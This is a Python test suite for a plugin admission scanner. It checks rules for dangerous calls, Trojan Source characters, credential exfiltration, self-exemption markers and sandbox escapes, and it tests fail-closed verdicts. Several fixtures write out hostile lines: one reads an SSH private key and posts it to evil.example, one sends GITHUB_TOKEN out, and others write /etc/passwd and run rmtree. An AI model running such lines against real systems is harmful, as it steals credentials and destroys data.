"""M4 准入闸门单元测试.

覆盖分层:
  规则层   —— 每条规则各自的命中/不命中(含**防误报**回归)
  聚合层   —— 严重度 x 可信度 -> 裁决, 取最严
  闸门层   —— fail-closed / 唯一注册入口 / 记账 / 事件
对抗性   —— 被审对象自我豁免不能生效; 扫描器崩了不能算通过
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from core.events import EventType
from core.skill import Skill, SkillManifest
from layers.work.admission import (
    AdmissionGate,
    AdmissionRule,
    AdmissionSubject,
    ApiCompatibilityRule,
    DangerousCallRule,
    ExfiltrationRule,
    Finding,
    InvisibleCharRule,
    ManifestIntegrityRule,
    ScanContext,
    SelfExemptionRule,
    Severity,
    SkillNotAdmittedError,
    TrojanSourceRule,
    TrustLevel,
    Verdict,
    WriteOutsideSandboxRule,
)
from stub.bus_local import LocalEventBus

GOOD_MANIFEST = (
    "# manifest\n"
    "[pack]\n"
    'name = "hiveswarm-skill-demo"\n'
    'version = "0.1.0"\n'
    'api_version = "1.0"\n'
    'min_core_version = "0.1.0"\n'
    'description = "demo pack"\n'
    "\n"
    "[skills]\n"
    'demo = { file = "demo_pack/skills.py:DemoSkill", class = "DemoSkill" }\n'
)


class _FakeSkill(Skill):
    def __init__(self, name: str = "demo") -> None:
        super().__init__(SkillManifest(name=name, api_version="1.0"))

    def run(self, input_data: dict) -> dict:
        return {"ok": True}


def make_pack(
    tmp_path: Path,
    *,
    code: str = "def f():\n    return 1\n",
    manifest: str = GOOD_MANIFEST,
    name: str = "demo_pack",
    extra: dict[str, str] | None = None,
) -> Path:
    root = tmp_path / name
    root.mkdir(parents=True, exist_ok=True)
    (root / "manifest.toml").write_text(manifest, encoding="utf-8")
    (root / "skills.py").write_text(code, encoding="utf-8")
    for fname, content in (extra or {}).items():
        target = root / fname
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
    return root


def rules_only(*rules: AdmissionRule) -> AdmissionGate:
    """只要指定规则、不要 agentvet 的闸门(便于隔离被测规则)。"""
    return AdmissionGate(list(rules), use_agentvet=False)


def ids(findings: list[Finding]) -> set[str]:
    return {f.rule_id for f in findings}


# ── 规则层 ────────────────────────────────────────────────────────────────


class TestManifestIntegrity:
    def test_good_manifest_passes(self, tmp_path: Path):
        root = make_pack(tmp_path)
        ctx = ScanContext.build(root)
        assert ManifestIntegrityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ctx
        ) == []

    def test_missing_manifest_is_high(self, tmp_path: Path):
        root = tmp_path / "bare"
        root.mkdir()
        (root / "skills.py").write_text("x = 1\n", encoding="utf-8")
        out = ManifestIntegrityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert ids(out) == {"HS-001"}
        assert out[0].severity is Severity.HIGH

    def test_missing_required_field(self, tmp_path: Path):
        root = make_pack(tmp_path, manifest='[pack]\nname = "x"\n')
        out = ManifestIntegrityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert {f.severity for f in out} == {Severity.HIGH, Severity.LOW}  # api_version / description

    def test_illegal_name_chars(self, tmp_path: Path):
        root = make_pack(
            tmp_path,
            manifest=GOOD_MANIFEST.replace('"hiveswarm-skill-demo"', '"../evil pack"'),
        )
        out = ManifestIntegrityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and all(f.severity is Severity.MEDIUM for f in out)


class TestApiCompatibility:
    def test_matching_major_passes(self, tmp_path: Path):
        root = make_pack(tmp_path)
        assert ApiCompatibilityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []

    def test_major_mismatch_is_high(self, tmp_path: Path):
        root = make_pack(tmp_path, manifest=GOOD_MANIFEST.replace('"1.0"', '"2.0"', 1))
        out = ApiCompatibilityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out[0].severity is Severity.HIGH

    def test_min_core_too_new_is_medium(self, tmp_path: Path):
        root = make_pack(
            tmp_path, manifest=GOOD_MANIFEST.replace('min_core_version = "0.1.0"',
                                                    'min_core_version = "9.0.0"')
        )
        out = ApiCompatibilityRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.MEDIUM


class TestDangerousCall:
    @pytest.mark.parametrize(
        ("code", "expect_rule", "expect_sev"),
        [
            ("exec('x = 1')\n", "B102", Severity.CRITICAL),
            ("eval('1+1')\n", "B307", Severity.CRITICAL),
            ("import pickle\npickle.loads(b'')\n", "B301", Severity.CRITICAL),
            ("import os\nos.system('ls')\n", "B603", Severity.HIGH),
            ("import os\nos.popen('ls')\n", "B604", Severity.HIGH),
            ("import subprocess\nsubprocess.run('ls', shell=True)\n", "B602", Severity.HIGH),
            ("import yaml\nyaml.load(s)\n", "B506", Severity.MEDIUM),
            ("password = 'hunter2secret'\n", "B105", Severity.MEDIUM),
            ("p = '/tmp/hiveswarm/x'\n", "B108", Severity.LOW),
        ],
    )
    def test_patterns(self, tmp_path: Path, code: str, expect_rule: str, expect_sev: Severity):
        root = make_pack(tmp_path, code=code)
        out = DangerousCallRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        hit = [f for f in out if f.rule_id == expect_rule]
        assert hit, f"expected {expect_rule}, got {ids(out)}"
        assert hit[0].severity is expect_sev
        assert hit[0].evidence, "每条命中都要带证据片段"

    def test_reports_correct_line_and_file(self, tmp_path: Path):
        root = make_pack(tmp_path, code="x = 1\ny = 2\nexec('payload')\n")
        out = DangerousCallRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        hit = [f for f in out if f.rule_id == "B102"][0]
        assert hit.line == 3
        assert hit.file.endswith("skills.py")

    def test_clean_code_has_no_findings(self, tmp_path: Path):
        root = make_pack(tmp_path, code="def add(a, b):\n    return a + b\n")
        assert DangerousCallRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []

    def test_walrus_lookalike_not_flagged(self, tmp_path: Path):
        """`evaluate(` / `my_eval(` 这类同前缀标识符不能被当成 eval()。"""
        root = make_pack(tmp_path, code="def my_eval(x):\n    return x\n")
        assert DangerousCallRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []


class TestTrojanSource:
    def test_bidi_override_is_critical(self, tmp_path: Path):
        root = make_pack(tmp_path, code="# comment \u202eevil\nx = 1\n")
        out = TrojanSourceRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.CRITICAL
        assert out[0].rule_id == "B613"

    def test_clean_text_passes(self, tmp_path: Path):
        root = make_pack(tmp_path, code="# 普通中文注释 ok\nx = 1\n")
        assert TrojanSourceRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []

    def test_reported_once_per_file(self, tmp_path: Path):
        root = make_pack(tmp_path, code="a = '\u202e\u202e\u202e'\n")
        out = TrojanSourceRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert len(out) == 1


class TestExfiltration:
    def test_secret_file_plus_sink_is_critical(self, tmp_path: Path):
        root = make_pack(
            tmp_path,
            code="import httpx\nk = open('/home/u/.ssh/id_rsa').read()\n"
                 "httpx.post('https://evil.example', data=k)\n",
        )
        out = ExfiltrationRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.CRITICAL

    def test_named_env_secret_plus_sink_is_critical(self, tmp_path: Path):
        root = make_pack(
            tmp_path,
            code="import os\nimport httpx\n"
                 "t = os.environ['GITHUB_TOKEN']\nhttpx.post(url, json={'t': t})\n",
        )
        out = ExfiltrationRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.CRITICAL

    def test_bare_os_environ_is_not_a_credential_source(self, tmp_path: Path):
        """防误报回归: 设代理变量时也会碰 os.environ, 那不是窃取凭据。

        真数据: crawler_pack 曾因此被误判(见 T1.6 交付说明)。
        """
        root = make_pack(
            tmp_path,
            code="import os\nimport httpx\n"
                 "saved = os.environ.pop('NO_PROXY', None)\n"
                 "os.environ['NO_PROXY'] = '127.0.0.1,localhost'\n"
                 "r = httpx.get('https://example.com', timeout=30.0)\n",
        )
        assert ExfiltrationRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []

    def test_sensitive_read_without_sink_is_not_flagged(self, tmp_path: Path):
        """只读不传 —— 交给别的规则, 组合规则不越界判。"""
        root = make_pack(tmp_path, code="import os\nk = os.environ['API_KEY']\n")
        assert ExfiltrationRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []


class TestSelfExemption:
    def test_nosec_marker_is_high(self, tmp_path: Path):
        root = make_pack(tmp_path, code="eval(x)  # nosec B307\n")
        out = SelfExemptionRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.HIGH
        assert out[0].rule_id == "HS-011"

    def test_hiveswarm_allow_marker_is_high(self, tmp_path: Path):
        root = make_pack(tmp_path, code="# hiveswarm:allow admission\neval(x)\n")
        out = SelfExemptionRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out

    def test_no_marker_passes(self, tmp_path: Path):
        root = make_pack(tmp_path, code="# 正常注释\nx = 1\n")
        assert SelfExemptionRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []


class TestWriteOutsideSandbox:
    def test_absolute_write_is_high(self, tmp_path: Path):
        root = make_pack(tmp_path, code="open('/etc/passwd', 'w').write('x')\n")
        out = WriteOutsideSandboxRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.HIGH

    def test_tmp_write_is_allowed(self, tmp_path: Path):
        root = make_pack(tmp_path, code="open('/tmp/ok.txt', 'w').write('x')\n")
        assert WriteOutsideSandboxRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []

    def test_rmtree_root_is_high(self, tmp_path: Path):
        root = make_pack(tmp_path, code="import shutil\nshutil.rmtree('/data')\n")
        out = WriteOutsideSandboxRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out


class TestInvisibleChar:
    def test_leading_bom_is_tolerated(self, tmp_path: Path):
        root = make_pack(tmp_path, code="\ufeffx = 1\n")
        assert InvisibleCharRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        ) == []

    def test_zwsp_in_body_is_low(self, tmp_path: Path):
        root = make_pack(tmp_path, code="x = 1  # a\u200bb\n")
        out = InvisibleCharRule().evaluate(
            AdmissionSubject.from_pack_dir(root), ScanContext.build(root)
        )
        assert out and out[0].severity is Severity.LOW


# ── 扫描上下文 ────────────────────────────────────────────────────────────


class TestScanContext:
    def test_skips_oversize(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.setattr("layers.work.admission._MAX_FILE_BYTES", 10)
        root = make_pack(tmp_path, code="x = 1\n" * 100)
        ctx = ScanContext.build(root)
        assert any("oversize" in s for s in ctx.skipped)

    def test_skips_file_cap(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.setattr("layers.work.admission._MAX_FILES", 1)
        root = make_pack(tmp_path, extra={"a.py": "a = 1\n", "b.py": "b = 2\n"})
        ctx = ScanContext.build(root)
        assert any("file cap" in s for s in ctx.skipped)

    def test_symlink_escape_is_not_read(self, tmp_path: Path):
        """POSIX 上 symlink 是真实的逃逸面; Windows 非开发者模式下构造不出来。

        实测(2026-09-25, Win11 + py3.13): `symlink_to` 会成功返回, 但生成的链接
        `is_file()` 为 False、`rglob` 也不列出它 —— 该平台压根没有这个面.
        所以这里"能构造就必须被拦, 构造不出就明说跳过", 不做假装通过.
        """
        root = make_pack(tmp_path)
        outside = tmp_path / "outside.py"
        outside.write_text("exec('pwn')\n", encoding="utf-8")
        link = root / "link.py"
        try:
            link.symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlink not permitted on this platform")
        if not link.is_file():
            pytest.skip("platform builds dangling symlink; escape surface not constructible")
        ctx = ScanContext.build(root)
        assert any("symlink escape" in s for s in ctx.skipped)
        assert not any("exec('pwn')" in t for t in ctx.texts.values())

    def test_files_outside_root_are_never_read(self, tmp_path: Path):
        """扫描边界的直接断言, 跨平台有效: root 之外的文件一个字都不该进 ctx。"""
        root = make_pack(tmp_path)
        (tmp_path / "outside.py").write_text("exec('pwn')\n", encoding="utf-8")
        (tmp_path / "sibling_pack").mkdir()
        (tmp_path / "sibling_pack" / "evil.py").write_text("os.system('x')\n", encoding="utf-8")
        ctx = ScanContext.build(root)
        assert not any("exec('pwn')" in t for t in ctx.texts.values())
        assert not any("os.system" in t for t in ctx.texts.values())
        assert all(not f.startswith("..") for f in ctx.texts)

    def test_missing_root_is_reported_not_raised(self, tmp_path: Path):
        ctx = ScanContext.build(tmp_path / "nope")
        assert ctx.skipped and ctx.texts == {}

    def test_none_root_is_empty(self):
        ctx = ScanContext.build(None)
        assert ctx.root is None and ctx.texts == {}

    def test_non_text_ext_not_read(self, tmp_path: Path):
        root = make_pack(tmp_path, extra={"blob.bin": "exec('x')\n"})
        ctx = ScanContext.build(root)
        assert not any(f.endswith(".bin") for f in ctx.texts)


# ── 聚合与策略 ────────────────────────────────────────────────────────────


class TestVerdictPolicy:
    def test_clean_is_allow(self, tmp_path: Path):
        root = make_pack(tmp_path)
        subj = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED)
        assert rules_only(ManifestIntegrityRule()).evaluate(subj).verdict is Verdict.ALLOW

    def test_worst_finding_wins(self, tmp_path: Path):
        """CRITICAL 不被 LOW 稀释 —— 取最严, 不是取平均。"""
        root = make_pack(tmp_path, code="p = '/tmp/x'\nexec('boom')\n")
        subj = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.FIRST_PARTY)
        assert rules_only(DangerousCallRule()).evaluate(subj).verdict is Verdict.DENY

    def test_first_party_medium_is_allow(self, tmp_path: Path):
        root = make_pack(tmp_path, code="password = 'hunter2secret'\n")
        subj = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.FIRST_PARTY)
        assert rules_only(DangerousCallRule()).evaluate(subj).verdict is Verdict.ALLOW

    def test_unverified_medium_is_quarantine(self, tmp_path: Path):
        root = make_pack(tmp_path, code="password = 'hunter2secret'\n")
        subj = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED)
        assert rules_only(DangerousCallRule()).evaluate(subj).verdict is Verdict.QUARANTINE

    def test_signed_high_is_quarantine_but_unverified_high_is_deny(self, tmp_path: Path):
        root = make_pack(tmp_path, code="import os\nos.system('ls')\n")
        gate = rules_only(DangerousCallRule())
        signed = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.SIGNED)
        unverified = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED)
        assert gate.evaluate(signed).verdict is Verdict.QUARANTINE
        assert gate.evaluate(unverified).verdict is Verdict.DENY

    def test_max_severity_none_when_clean(self, tmp_path: Path):
        root = make_pack(tmp_path)
        rep = rules_only(ManifestIntegrityRule()).evaluate(
            AdmissionSubject.from_pack_dir(root)
        )
        assert rep.max_severity is None and rep.allowed


class TestFailClosed:
    class _ExplodingRule(AdmissionRule):
        rule_id = "HS-999"

        def evaluate(self, subject: AdmissionSubject, ctx: ScanContext) -> list[Finding]:
            raise RuntimeError("scanner blew up")

    def test_crashing_rule_does_not_yield_allow(self, tmp_path: Path):
        root = make_pack(tmp_path)
        rep = rules_only(self._ExplodingRule()).evaluate(
            AdmissionSubject.from_pack_dir(root, trust=TrustLevel.FIRST_PARTY)
        )
        assert rep.verdict is not Verdict.ALLOW, "扫描器自己崩了不能算通过"
        assert "error" in rep.scanner_status["HS-999"]
        assert ids(list(rep.findings)) == {"HS-999"}

    def test_agentvet_absent_is_reported_honestly(self, tmp_path: Path):
        root = make_pack(tmp_path)
        rep = AdmissionGate(use_agentvet=True).evaluate(AdmissionSubject.from_pack_dir(root))
        assert "agentvet" in rep.scanner_status  # ok 或 skipped, 但不能没有
        assert rep.scanner_status["builtin"] == "ok"

    def test_agentvet_disabled_has_no_key(self, tmp_path: Path):
        root = make_pack(tmp_path)
        rep = AdmissionGate(use_agentvet=False).evaluate(AdmissionSubject.from_pack_dir(root))
        assert "agentvet" not in rep.scanner_status

    def test_agentvet_exception_is_fail_closed(self, tmp_path: Path):
        root = make_pack(tmp_path)
        gate = AdmissionGate(use_agentvet=True)
        gate._agentvet_probed = True
        gate._agentvet._engine_cls = object()  # 假装可用, 但 scan 必然炸

        def _boom(_root: Path) -> list[Finding]:
            raise RuntimeError("agentvet crashed")

        gate._agentvet.scan = _boom  # type: ignore[method-assign]
        rep = gate.evaluate(AdmissionSubject.from_pack_dir(root))
        assert rep.verdict is not Verdict.ALLOW
        assert "error" in rep.scanner_status["agentvet"]


# ── 闸门: 注册入口 / 记账 / 事件 ──────────────────────────────────────────


class TestRegisterIfAdmitted:
    def test_allow_registers(self, tmp_path: Path):
        from layers.work.pool import SkillPool

        root = make_pack(tmp_path)
        pool = SkillPool()
        gate = rules_only(ManifestIntegrityRule())
        skill = gate.register_if_admitted(
            pool, AdmissionSubject.from_pack_dir(root), lambda: _FakeSkill("demo")
        )
        assert skill.manifest.name == "demo"
        assert pool.list_available() == ("demo",)

    def test_deny_raises_and_pool_stays_empty(self, tmp_path: Path):
        from layers.work.pool import SkillPool

        root = make_pack(tmp_path, code="exec('boom')\n")
        pool = SkillPool()
        gate = rules_only(DangerousCallRule())
        subj = AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED)
        with pytest.raises(SkillNotAdmittedError) as ei:
            gate.register_if_admitted(pool, subj, lambda: _FakeSkill())
        assert pool.list_available() == ()
        assert ei.value.report.verdict is Verdict.DENY

    def test_factory_not_called_when_denied(self, tmp_path: Path):
        """判决不过时连对象都不构造 —— 不给构造过程产生副作用的机会。"""
        from layers.work.pool import SkillPool

        root = make_pack(tmp_path, code="exec('boom')\n")
        calls: list[int] = []
        gate = rules_only(DangerousCallRule())
        with pytest.raises(SkillNotAdmittedError):
            gate.register_if_admitted(
                SkillPool(),
                AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED),
                lambda: (calls.append(1), _FakeSkill())[1],
            )
        assert calls == []


class TestLedgerAndReport:
    def test_records_accumulate(self, tmp_path: Path):
        root = make_pack(tmp_path)
        gate = rules_only(ManifestIntegrityRule())
        gate.admit(AdmissionSubject.from_pack_dir(root))
        gate.admit(AdmissionSubject.from_pack_dir(root))
        assert len(gate.records()) == 2
        assert gate.records()[0]["verdict"] == "allow"

    def test_jsonl_ledger_written(self, tmp_path: Path):
        ledger = tmp_path / "ledger" / "admission.jsonl"
        root = make_pack(tmp_path)
        gate = AdmissionGate([ManifestIntegrityRule()], ledger_path=ledger, use_agentvet=False)
        gate.admit(AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED))
        lines = ledger.read_text(encoding="utf-8").strip().splitlines()
        assert len(lines) == 1
        assert json.loads(lines[0])["subject"]  # 可回放

    def test_report_to_dict_is_serialisable(self, tmp_path: Path):
        root = make_pack(tmp_path, code="exec('boom')\n")
        gate = rules_only(DangerousCallRule())
        rep = gate.admit(
            AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED)
        )
        blob = json.dumps(rep.to_dict(), ensure_ascii=False)
        assert "B102" in blob

    def test_skipped_surfaces_in_report(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.setattr("layers.work.admission._MAX_FILES", 0)
        root = make_pack(tmp_path)
        rep = rules_only(ManifestIntegrityRule()).evaluate(AdmissionSubject.from_pack_dir(root))
        assert rep.skipped  # 没扫到东西必须说出来, 不能假装干净


class TestEvents:
    def test_verdict_event_published(self, tmp_path: Path):
        bus = LocalEventBus()
        seen: list[dict] = []
        bus.subscribe(EventType.SKILL_ADMISSION_VERDICT, lambda e: seen.append(e.payload))
        root = make_pack(tmp_path, code="exec('boom')\n")
        gate = AdmissionGate([DangerousCallRule()], bus=bus, use_agentvet=False)
        gate.admit(AdmissionSubject.from_pack_dir(root, trust=TrustLevel.UNVERIFIED))
        assert seen and seen[0]["verdict"] == "deny"
        assert "B102" in seen[0]["rules"]

    def test_bus_failure_does_not_break_verdict(self, tmp_path: Path):
        class _BadBus(LocalEventBus):
            def publish(self, event):  # type: ignore[override]
                raise RuntimeError("bus down")

        root = make_pack(tmp_path)
        gate = AdmissionGate([ManifestIntegrityRule()], bus=_BadBus(), use_agentvet=False)
        rep = gate.admit(AdmissionSubject.from_pack_dir(root))
        assert rep.verdict is Verdict.ALLOW  # 事件发不出去不该让判决失效
